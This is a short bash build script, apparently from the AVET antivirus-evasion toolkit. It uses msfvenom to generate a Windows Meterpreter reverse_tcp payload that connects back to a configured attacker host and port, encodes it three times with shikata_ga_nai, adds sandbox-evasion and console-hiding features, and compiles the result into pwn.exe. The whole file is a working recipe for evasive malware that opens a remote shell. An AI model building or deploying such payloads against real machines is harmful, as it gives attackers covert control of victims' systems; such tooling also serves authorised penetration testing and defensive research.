#!/bin/bash      
# example build script

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh

# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST

# generate payload and call avet
msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt

# keep make_avet to at least get the shellcode input
# request debug outputs via -p flag
./make_avet -f sc.txt -p

# import feature construction interface
. build/feature_construction.sh

# add fopen sandbox evasion feature
add_feature fopen_sandbox_evasion

# hide console window
add_feature hide_console

# set shellcode binding technique
shellcode_binding exec_shellcode

# add gethostbyname killswitch evasion feature
#append_value KVALUE localhost
#add_feature gethostbyname_sandbox_evasion

# compile
$win32_compiler -o pwn.exe avet.c

# cleanup
rm sc.txt && echo "" > defs.h
cleanup_techniques